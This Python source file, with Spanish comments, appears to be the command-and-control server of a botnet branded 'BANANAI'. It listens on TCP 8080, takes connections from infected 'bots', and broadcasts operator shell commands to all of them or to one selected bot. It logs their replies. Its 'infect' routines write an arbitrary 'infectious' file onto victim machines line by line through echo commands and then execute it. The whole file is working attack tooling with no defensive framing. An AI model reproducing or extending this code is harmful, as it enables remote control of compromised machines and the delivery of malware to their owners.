import socket
import os
import queue
import threading
import time
from datetime import datetime
threads = []
threadsDic = {}
contador = [1]
estado = [0]
principalQueue = queue.Queue()
directory = "prueba" #str(datetime.now())

def createDirectories():
    try:
        os.makedirs(directory)
    except Exception as ex:
        print("[-]",ex)
        os._exit(0)

def command():
    print("[+] Comandos [+]\ncmd\t[comando a ejecutar]\t>>\tEjecuta comandos de cmd que no es necesario una respuesta del bot\ncmdout\t[comando a ejecutar]\t>>\tEjecuta comandos de cmd que necesita de una respuesta del bot")

def infectSelect():
    fileName = input("[+] Cual nombre tendra el archivo: ")
    if(fileName == "cancel"):
        return 0;
    folderName = input("[+] En que carpeta se guardara: ")
    if(folderName== "cancel"):
        return 0;
    code = input("[+] Nombre del archivo a enviar: ")
    if(code == "cancel"):
        return 0;
    file = open(code,"r")
    command = "cmd mkdir " + folderName
    time.sleep(0.1)
    principalQueue.put(command)
    try:
        command = "cmd echo #banano-cry"+ " > " +folderName + "\\" + fileName
    except Exception as ex:
        print("[-] {}".format(ex))

    time.sleep(0.1)
    principalQueue.put(command)

    while(True):
        line = file.readline()
        if not line:
            break
        if(line[-1] == "\n"):
            line = line[:-1]
        command = "cmd echo "+line +" >> " +folderName + "\\" + fileName
        principalQueue.put(command)

    file.close()
    time.sleep(10)
    print("[+] Se copio el archivo con exito, desea ejecutarlo? [y] [n]: ",end="")
    answer = input()
    if answer == "y":
        print("[+] Ejecutando programa...")
        command = "exec "+folderName+"\\"+fileName
        try:
            time.sleep(0.1)
            principalQueue.put(command)
        except Exception as ex:
            print("[-] {}".format(ex))

    else:
        print("[-] No se ejecuto el programa...")

def infect():
    fileName = input("[+] Cual nombre tendra el archivo: ")
    if(fileName == "cancel"):
        return 0;
    folderName = input("[+] En que carpeta se guardara: ")
    if(folderName== "cancel"):
        return 0;
    code = input("[+] Nombre del archivo a enviar: ")
    if(code == "cancel"):
        return 0;
    file = open(code,"r")
    command = "cmd mkdir " + folderName
    time.sleep(0.1)
    principalQueue.put(command)
    try:
        command = "cmd echo #banano-cry"+ " > " +folderName + "\\" + fileName
    except Exception as ex:
        print("[-] {}".format(ex))

    time.sleep(0.1)
    principalQueue.put(command)

    while(True):
        line = file.readline()
        if not line:
            break
        if(line[-1] == "\n"):
            line = line[:-1]

        command = "cmd echo "+line +" >> " +folderName + "\\" + fileName

        principalQueue.put(command)


    file.close()
    time.sleep(7)
    print("[+] Se copio el archivo con exito, desea ejecutarlo? [y] [n]: ",end="")
    answer = input()
    if answer == "y":
        print("[+] Ejecutando programa...")
        command = "exec "+folderName+"\\"+fileName
        try:
            time.sleep(0.1)
            principalQueue.put(command)
        except Exception as ex:
            print("[-] {}".format(ex))

    else:
        print("[-] No se ejecuto el programa...")

def names():
    for i in range(len(threads)):
        print("[{}]{}".format(i,threads[i].getName()))

def helpFunc():
    print("[+] AYUDA [+]\ncommand \t-->\t Muesta los comandos aceptados para ser enviados a los bots\ncount \t\t-->\t Cantidad de bots conectados\nchange \t\t-->\t Cambiar el estado de salida de datos\nnames \t\t-->\t Listar los nombres de los bots conectados\nread\t\t-->\t Lee el archivo con informacion en los bots\ninfect\t\t-->\t Inicia el proceso de envio de un archivo infeccioso\nselect [bot]\t-->\t Selecciona a un unico bot\nexit \t\t-->\t Cerrar todas las conexiones y salir del programa")

def count():
    print("[+] Hay un total de [{}] bots conectados!!\n".format(len(threads)))

def status():
    if(estado[0] == 0):
        print("[+] Todos los datos estan siendo guardado en archivos y se muestran en pantalla\n")
    else:
        print("[+] Todos los datos estan siendo uardados en archivos y no se muestran en pantalla\n")

def change():
    if(estado[0] == 0):
        estado[0] = 1
    else:
        estado[0] = 0
    status()

class  serverThread(threading.Thread):
    def __init__(self,queueServer):
        threading.Thread.__init__(self,name='Server')
        self.principalQueue = queueServer
        self.status = True
    def selectBot(self,botThread):
        os.system('clear')
        for i in threads:
            if i == botThread:
                pass
            else:
                i.pause()

        for i in range(len(threads)):
            self.principalQueue.put("")
        for i in range(len(threads)):
            dirt = self.principalQueue.get()
        self.status = False
        while True:
            consoleSndSelect = str(input('[select --> {}]$ '.format(botThread.getName())))
            if(consoleSndSelect == "exit"):
                for i in threads:
                    if i == botThread:
                        pass
                    else:
                        i.resume()
                self.status = True
                print('[-] Volviendo al seleccionar a todos ...\n')
                time.sleep(1.5)
                os.system('clear')
                break

            elif(consoleSndSelect == ""):
                pass

            elif(consoleSndSelect == "change"):
                change()

            elif(consoleSndSelect == "infect"):
                infectSelect()

            else:
                print('[+] Enviando comando al bot <{}>'.format(botThread.getName()))
                self.principalQueue.put(consoleSndSelect)
                time.sleep(1)

    def run(self):
        os.system('clear')
        print("""██████╗  █████╗ ███╗   ██╗ █████╗ ███╗   ██╗ █████╗ ██╗
██╔══██╗██╔══██╗████╗  ██║██╔══██╗████╗  ██║██╔══██╗██║
██████╔╝███████║██╔██╗ ██║███████║██╔██╗ ██║███████║██║
██╔══██╗██╔══██║██║╚██╗██║██╔══██║██║╚██╗██║██╔══██║██║
██████╔╝██║  ██║██║ ╚████║██║  ██║██║ ╚████║██║  ██║██║
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝
""")
        while True:
            if(status):
                consoleSnd = str(input('[BotNet]$ '))
                if(consoleSnd == ""):
                 pass

                elif(consoleSnd == "help"):
                    helpFunc()

                elif(consoleSnd == "command"):
                    command()

                elif(consoleSnd == "count"):
                    count()

                elif(consoleSnd == "change"):
                    change()

                elif(consoleSnd == "names"):
                    names()

                elif(consoleSnd == "infect"):
                    infect()

                elif(consoleSnd == "exit"):
                    for i in range(len(threads)):
                        self.principalQueue.put(consoleSnd)
                        time.sleep(0.1)
                    time.sleep(0.5)
                    os._exit(0)

                elif(consoleSnd.split(" ")[0] == "select"):
                    for work in threads:
                        if(consoleSnd.split(" ")[1] == work.getName()):
                            self.selectBot(work)
                            break
                    else:
                        print('[-] No se encontro ninguna coincidencia con el nombre <{}>'.format(consoleSnd.split(" ")[1]))

                else:
                    print('[+] Enviando comando <{}> a {} bots'.format(consoleSnd,str(len(threads))))
                    for i in range(len(threads)):
                        time.sleep(0.1)
                        self.principalQueue.put(consoleSnd)
                    time.sleep(1)

class botThread(threading.Thread):
    def __init__(self,bot,botAddress,queue):
        self.botName = "Bot#"+str(contador[0])
        self.id = contador[0]
        threading.Thread.__init__(self,name=self.botName)
        self.botIP = botAddress[0]
        self.botPort = botAddress[1]
        self.bot = bot
        self.botAddress = botAddress
        self.principalQueue = queue
        self.running = True

    def pause(self):
        self.running = False

    def resume(self):
        self.running = True

    def run(self):
        nameBot = threading.current_thread().getName()
        self.running = True
        print('[+] Conexion proveniente::{}:{} conectando con {}'.format(str(self.botIP),str(self.botPort),nameBot))
        while True:
            if(self.running):
                executeBotCmd = self.principalQueue.get()
                try:
                    #executeBotCmd+= "\n"
                    self.bot.send(executeBotCmd.encode('utf-8'))
                    ansBot=""
                    try:
                        ansBot = (self.bot.recv(2048)).decode('utf-8','ignore')
                    except Exception as ex:
                        print("[-] Error al leer la respusesta del bot llamado: {} ERROR: {}".format(nameBot,ex))
                    archivo = open("./{}/{}.txt".format(directory,nameBot),"a")
                    archivo.write("{}:\n{}".format(executeBotCmd,ansBot))
                    archivo.close()
                    if(estado[0] == 0):
                        if ansBot[0] == '\n' and len(ansBot) <= 2:
                            ansBot = "Se ejecuto el comando correctamente\n"
                        print("{} Responde:\n".format(nameBot),ansBot)
                except Exception as ex:
                    print('\n[-] El bot llamado: {} se ha desconectado... \n{}'.format(nameBot,ex))
                    threads.remove(threadsDic[self.id])
                        #print('[-] Error al ejecutar el comando <{}>'.format(ex))
                    break
            else:
                executeBotCmd = None

def handler(port,host,queue):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    serverAddress = (host,port)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
    server.bind(serverAddress)
    server.listen(10)
    print("[+] Conexion bot/servidor establecida por TCP <{}:{}>\n".format(host,str(port)));

    cmdServer = serverThread(queue);
    cmdServer.start()
    while True:
        (bot,botAddress) = server.accept()
        newBot = botThread(bot,botAddress,principalQueue)
        threads.append(newBot)
        threadsDic[contador[0]] = newBot
        contador[0] = contador[0]+1
        newBot.start()

def main():
    localPort = 8080
    localAddress = '0.0.0.0'
 #   createDirectories()
    try:
        handler(localPort,localAddress,principalQueue)
    except Exception as ex:
        print("\nError al tratar de vincular::{}\n".format(str(ex)))

if __name__ == '__main__':
    main()
